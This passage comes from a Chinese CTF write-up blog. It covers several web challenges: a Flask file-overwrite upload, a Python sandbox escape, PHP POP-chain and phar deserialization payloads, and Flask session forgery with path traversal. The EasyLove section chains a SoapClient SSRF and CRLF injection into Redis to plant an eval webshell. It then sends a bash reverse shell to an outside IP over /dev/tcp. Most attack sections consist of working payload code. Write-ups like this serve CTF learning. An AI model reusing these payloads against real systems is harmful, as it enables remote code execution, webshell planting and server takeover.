text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=<span class="number">0.9</span></span><br><span class="line">Cookie: session-name=MTY4NTE3NzM2NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxY2f3GZVJmQsLELqlORmAjQMLNbC9ZF0rs_HfZqjIRlw==</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">488</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;118.117.49.52&quot;</span>; filename=<span class="string">&quot;server.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: text/x-python</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> result.stdout.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3--</span><br></pre></td></tr></table></figure><p>覆盖完后，访问<code>/flask?name=</code>，成功读取到了&#x2F;flag</p><p><img src="/../images/image-20230608102742110.png" alt="image-20230608102742110"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a><strong>pyshell</strong></h2><p>一眼python沙盒逃逸</p><p>简单测试一下</p><p><img src="/../images/image-20230528175915350-1686150302070.png" alt="image-20230528175915350"></p><p><img src="/../images/image-20230528180007692-1686150302070.png" alt="image-20230528180007692"></p><p>绕一下<code>__import__</code>和<code>system</code></p><p><img src="/../images/image-20230528175941443-1686150302070.png" alt="image-20230528175941443"></p><p>可以用+拼接绕过，最后用_特性和eval函数执行字符串即可</p><p><img src="/../images/image-20230528180159183-1686150302070.png" alt="image-20230528180159183"></p><p>最后的payload</p><p><img src="/../images/image-20230528165834909-1686150302070.png" alt="image-20230528165834909"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU</title>
      <link href="/2023/05/31/BUU/"/>
      <url>/2023/05/31/BUU/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-10月赛"><a href="#2022-10月赛" class="headerlink" title="2022.10月赛"></a>2022.10月赛</h1><h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><p>pop链</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sorry::_destruct() ---&gt;  show::_tostring()  ---&gt;  secret_code::call ---&gt;  secret_code::show() ---&gt;  sorry::_get() </span><br><span class="line">---&gt;  fine::__invoke()</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发invoke&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cmd:<span class="subst">$this</span>-&gt;cmd,content:<span class="subst">$this</span>-&gt;content&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发wakeup&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发get&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发call&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发show&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"><span class="variable">$sor1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span>-&gt;hint = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;ctf = <span class="variable">$secret</span>;</span><br><span class="line"><span class="variable">$secret</span>-&gt;code = <span class="variable">$sor1</span>;</span><br><span class="line"><span class="variable">$sor1</span>-&gt;key = <span class="variable">$fine</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;cmd = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;content = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);<span class="comment">#更改fine属性绕过wakeup</span></span><br><span class="line"><span class="variable">$a</span> =<span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hade-waibo–复现"><a href="#hade-waibo–复现" class="headerlink" title="hade_waibo–复现"></a>hade_waibo–复现</h2><p>cancanneed 存在任意文件读取漏洞</p><p>获得index.php,file.php,class.php源码</p><p>审计class.php的内容，很容易可以知道这是phar反序列化+RCE。</p><p>需要绕过wakeup和正则。</p><p>wakeup是想用常规的属性个数绕过，但是不行，然后正则想不出来。。</p><hr><p>然后看了大佬们的wp后知道，在这道题的php版本下<code>用常规的属性个数绕过</code>是无效的。</p><p>有两个思路</p><ol><li><p>师傅博客：<a href="https://blog.csdn.net/trytowritecode/article/details/127513176">https://blog.csdn.net/trytowritecode/article/details/127513176</a></p><blockquote><p>总结：</p><p>先上传一个内容为</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh  (这里师傅写的是/bash，但是我测试时是不可以的，/sh是可以的)</span></span><br><span class="line">ls /</span><br></pre></td></tr></table></figure><p>的文件，然后重新登录一个名为<code>. ./*</code>的用户上传phar文件，触发反序列化覆盖Test-&gt;$value的值为<code>. ./*</code>,从而执行<code>system(&#39;. ./*&#39;)</code>,实际上是<code>ls /</code></p></blockquote><p>原理如下</p><p>shell中<code>./*</code>会将目录下的按字典排序的第一个文件当作shell脚本执行.</p><p><img src="/../images/image-20221027144023202-1687419303717.png" alt="image-20221027144023202"></p><p>解题</p><p><strong>绕过Test::wakeup，使得Test-&gt;value的值为我们想要的。</strong></p><p>这里涉及到了一个知识点</p><blockquote><p>在php里&amp;相当于两个变量都指向同一个地址，修改一个会影响到另一个。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014-1687419303718.png" alt="image-20221026153815014"></p><p>所以我们就需要找到一个可控变量，然后让<code>Test-&gt;value =  &amp;变量</code>，这样<code>Test-&gt;value</code>就是可控的了。</p><p>在User::wakeup中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br></pre></td></tr></table></figure><p>所以我们可以通过登录时的用户名来控制<code>Test-&gt;value</code>的值。</p><p>这里贴上师傅的payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$b-&gt;username=new Test(); 这个不需要</span></span><br><span class="line"><span class="comment">//同时反序列化User和Test类</span></span><br><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unlink(&quot;SKI12.phar&quot;);</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;SKI12.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还要注意</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br></pre></td></tr></table></figure><p>结果是Test类先完成反序列化，User类后完成反序列化，这样才能够绕过Test::wakeup.</p><p>然后按照上面总结的步骤就可以了。</p><p>贴上我复现成功的图</p><p><img src="/../images/image-20221027150538141-1687419303719.png" alt="image-20221027150538141"></p></li><li><p>官方wp</p><blockquote><p>总结：先写入一个文件名为cat的文件，再利用phar反序列化覆盖<code>Test-&gt;$value</code>的值为<code>* /*</code>，从而执行<code>system(&#39;* /*&#39;)</code>,实际上是<code>cat /*</code></p></blockquote><p>原理如下</p><p>shell中单独一个<code>*</code>会将目录下的文件名按照字典排序拼接成命令，第一个文件名作为命令，其他文件名作为命令参数。</p><p><img src="/../images/image-20221017102117317-1687419303719.png" alt="image-20221017102117317"></p><ul><li>写入文件</li></ul><p>用户名为数组绕过User::destruct中的弱比较，从而绕过User::wakeup，同时触发Test::tostring类，从而写入文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 弱比较</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">User-&gt;username = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br></pre></td></tr></table></figure><ul><li><p>执行命令</p><p>与上一个思路一致。</p></li></ul></li></ol><p>非预期解</p><p>直接读取根目录下的start.sh。。。</p><h2 id="EasyLove–复现"><a href="#EasyLove–复现" class="headerlink" title="EasyLove–复现"></a>EasyLove–复现</h2><p>原生类SoapClient发送SSRF请求+CRLF漏洞+redis漏洞</p><p>访问hint.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hint</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$hint</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;My favorite database is Redis and My favorite day is 20220311&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知道密码的redis</p><p>审计代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>new了一个类，并且调用了这个类的getflag()方法，再加上是redis，很明显是SoapClient类。</p><p>payload</p><blockquote><p>低版本的Redis会将http请求的请求头内容作为redis命令解析</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;AUTH 20220311&quot;</span>;</span><br><span class="line"><span class="variable">$poc1</span>=<span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$poc2</span>=<span class="string">&quot;SET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$poc3</span>=<span class="string">&quot;CONFIG SET dbfilename shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$poc4</span>=<span class="string">&quot;SAVE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span> =&gt;</span><br><span class="line"><span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc1</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc2</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc3</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc4</span>.<span class="string">&#x27;^^&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span> = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$swpu</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="variable">$swpu</span>-&gt;l61q4cheng = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$swpu</span>));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027164155928-1687419303719.png" alt="image-20221027164155928"></p><p>反弹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">22</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F120.77.73.212%2F2333%200%3E%261&#x27;</span>%<span class="number">22</span>)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>SUID提权</p><p><img src="/../images/image-20221027165218664-1687419303719.png" alt="image-20221027165218664"></p><h2 id="BlogSystem–复现"><a href="#BlogSystem–复现" class="headerlink" title="BlogSystem–复现"></a>BlogSystem–复现</h2><p>信息收集，在文章中出现了key，尝试构造session</p><p><img src="/../images/image-20221104151224136-1687419303719.png" alt="image-20221104151224136"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS E:\scripts\web\flask&gt; python flask-session.py encode -s <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span> -t <span class="string">&quot;&#123;&#x27;_permanent&#x27;: True, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s</span><br></pre></td></tr></table></figure><p>伪造后身份为admin,多了一个下载功能。</p><p><img src="/../images/image-20221105124636999-1687419303719.png" alt="image-20221105124636999"></p><p>可以猜测后端是使用了<code>os.path.join()</code>来连接path参数。</p><p>这里尝试目录穿越，师傅是尝试并猜测出后端的语句是<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code></p><p>其实也可以直接利用<code>os.path.join(path,path1)</code>的漏洞，只要拼接的路径path1是绝对路径，就会忽略掉path。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/tmp&#x27;</span>, <span class="string">&#x27;/home/khaz&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/home/khaz&#x27;</span></span><br></pre></td></tr></table></figure><p>读取app.py源码</p><p><img src="/../images/image-20221105130144960-1687419303719.png" alt="image-20221105130144960"></p><p>导入了<strong>config</strong> <strong>model</strong> <strong>view</strong>，典型的MVT结构</p><p><img src="/../images/image-20221105141455843-1687419303719.png" alt="image-20221105141455843"></p><p>尝试访问<code>/app/view.py</code>无果，访问<code>/app/view/__init__.py</code>,得到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .index <span class="keyword">import</span> index</span><br><span class="line"><span class="keyword">from</span> .blog <span class="keyword">import</span> blog</span><br></pre></td></tr></table></figure><p>读取源码 index.py blog.py</p><p>关键部分</p><ul><li>waf</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><ul><li>文件上传功能点</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment"># 还记得app.py注册了蓝图，所以路由为/blog/imgUpload</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)</span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)</span><br><span class="line">        file.save(filePath)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传成功!&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传失败&#x27;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li>读取文件功能点</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):</span><br><span class="line">        file = 